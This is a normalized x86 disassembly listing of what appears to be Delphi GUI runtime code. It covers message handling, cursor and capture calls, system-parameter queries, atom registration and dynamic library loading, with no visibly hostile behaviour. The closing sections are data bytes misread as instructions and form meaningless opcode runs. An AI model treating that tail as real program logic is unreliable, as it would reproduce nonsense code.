sub_451804
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44faf0
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_44f674
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_44faf0
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_451774
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_451854
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_446924
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_446924
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_4518d0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44f580
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_44f62c
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_44fbd4
test eax eax
je r-xdata
mov eax esi
call sub_44f5f8
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_451678
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_44fea4
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44fbd4
mov edx [ ebx + 0x20 ]
call sub_44fb2c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_4518d0
pop ecx
sub_451950
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_44f5dc
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_44f5dc
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_44fbd4
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_451950
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_451678
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_44fea4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_44f7d8
mov eax edi
call sub_44fbc8
test eax eax
je r-xdata
mov eax edi
call sub_44fbd4
mov esi eax
mov eax esi
call sub_44faf0
push eax
mov eax esi
call sub_44f62c
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_44fbc8
call sub_44faf0
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_44faf0
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_44fb18
mov eax esi
call sub_44faf0
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_44fb18
mov eax edi
call sub_44fbd4
call sub_44fb68
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_44f62c
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_44fb18
mov eax edi
call sub_44fbc8
call sub_44fb68
mov bl 0x1
jmp r-xdata
sub_451a88
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44fe3c
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_419ff0
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_450630
test eax eax
je r-xdata
push ebp
call sub_4518d0
pop ecx
push ebp
call sub_451950
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_451854
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_451b10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_44f6bc
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_44f6bc
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_451804
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_451804
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_451ba0
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_451f78
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406eec
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_450630
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4515d4
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406eec
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_450630
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_446ac8
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451f7f
lea eax [ ebp - 0x48 ]
call sub_404120
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44d7a4
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_4457e4
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_447c84
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_404120
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_451a88
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44c29c
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_451688
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406eec
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_451b10
pop ecx
mov eax [ ebp - 0x4 ]
call sub_451688
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406eec
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_450630
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_446ea4
jmp r-xdata
mov eax edi
call sub_4633a8
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_450630
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_446924
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_446f84
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_404174
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_451574
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464aa8
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44d7a4
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_44762c
jmp r-xdata
sub_451f88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403360
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_4520fc
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_452018
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4520d4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_45207c
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_4520ac
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406fd8
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_4520d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_452048
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_4520fc
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_452060
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_45207c
pop ebx
retn
mov eax ebx
call sub_4520ac
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_452160
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4522c6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_4523e4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_4523c8
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_4523c8
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_4524d4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403390
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403390
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403390
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403390
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404120
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404120
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_45255c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4526d4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_4092d8
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_404174
mov eax [ rw-data ]
call sub_4045e0
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_4092d8
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_404174
mov eax [ rw-data ]
call sub_4045e0
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_4045e0
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b8c0
mov [ rw-data ] eax
call sub_452160
mov dl 0x1
mov eax [ r-xdata ]
call sub_451f88
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_464384
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_465468
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_4670f8
mov ecx r-xdata
mov edx sub_444094
mov eax [ r-xdata ]
call sub_41ae14
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4526db
lea eax [ ebp - 0x10 ]
call sub_404120
lea eax [ ebp - 0x4 ]
call sub_404120
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_452726
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_452787
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45278e
retn
mov eax rw-data
call sub_40d7a0
call sub_4524d4
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404bd4
mov eax rw-data
call sub_404120
mov eax rw-data
call sub_404120
sub_452790
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_452816
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45281d
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_45255c
mov eax [ r-xdata ]
call sub_41ac88
mov eax [ r-xdata ]
call sub_41ad28
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41acd4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41acd4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41acd4
sub_452a64
stc
push ebx
push eax
call [ eax ]
xor al [ ebp ]
pop eax
xor al [ ebp ]
pop esp
xor al 0x45
add [ esp + esi + 0x45 ] bh
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add al al
xor [ ebp ] eax
xor al 0xbd
inc ecx
add [ eax ] ah
inc edx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
mov [ edx ] gs
inc ebp
add [ eax ] cl
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x3ea00006
inc ebp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
add [ eax - 0x44 ] dl
inc ecx
add al bh
inc edx
add ah ah
xor al [ ebp ]
in al dx
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
sub eax 0x300045
add [ eax ] al
test [ ecx + eax * 2 + 0x4035d800 ] dl
add ah ah
xor eax 0x35e80040
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
push eax
aad 0x41
add [ edi * 4 - 0x3713ffbf ] dh
inc ecx
add ah ah
mov [ ecx ] sub_41d7f8
sub al 0xd8
inc ecx
add [ eax ] dh
fadd [ ecx ]
xor al 0xd8
inc ecx
add al dl

arpl [ ebp + 0x74 ] si
pop eax
mov [ ecx ] eax
pushad
add [ eax ] al
jmp [ eax ]
or [ edi ] bh
inc edx
add [ eax ] al
inc eax
inc edx
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ ecx + esi + 0x45 ] dl
add [ eax + 0x33 ] ch
inc ebp
add [ edx + esi + 0x540b0045 ] ah
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
inc ebx
push 0x65676e61
inc esp
sub [ ebp ] eax
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0900
inc ebp
js r-xdata
sub [ ebp ] eax
pop eax
add [ eax ] al
[ esp + esi + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
pop eax
mov [ ecx ] eax
inc eax
add [ eax ] al
inc [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
or [ edi + 0x6e ] cl
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
shl [ ecx ] 0x45
add [ edi * 4 + 0x3e200041 ] dh
inc edx
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
adc al 0x9e
inc ecx
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x2b040000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp + 0x45 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp ] bh
inc ebp
add [ eax ] ch
add [ eax ] al
fsubr [ ecx ]
inc ebp
add [ eax ] bl
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
sub_452c48
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x2d
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
sub eax 0x300045
add [ eax ] al
test [ ecx + eax * 2 + 0x4035d800 ] dl
add ah ah
xor eax 0x35e80040
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
push eax
aad 0x41
add [ edi * 4 - 0x3713ffbf ] dh
inc ecx
add ah ah
mov [ ecx ] sub_41d7f8
sub al 0xd8
inc ecx
add [ eax ] dh
fadd [ ecx ]
xor al 0xd8
inc ecx
add al dl

sub_452cae
inc ecx
add [ eax + 0x40041d9 ] ch
fiadd [ ecx ]
fcomp st2
inc ecx
add [ ebx + edx * 8 ] bl
inc ecx
add [ ebx + ebx * 8 ] dl
inc ecx
add [ eax - 0x53ffbe25 ] cl
cmp al 0x45
add [ eax + 0x2c0041d5 ] bh
mov [ ecx ] sub_41d654
xchg esp eax
salc
inc ecx
add [ eax ] al
xlat
inc ecx
add [ ebx + ecx * 8 + 0x41 ] bh
add [ eax + 0x100041d8 ] dl
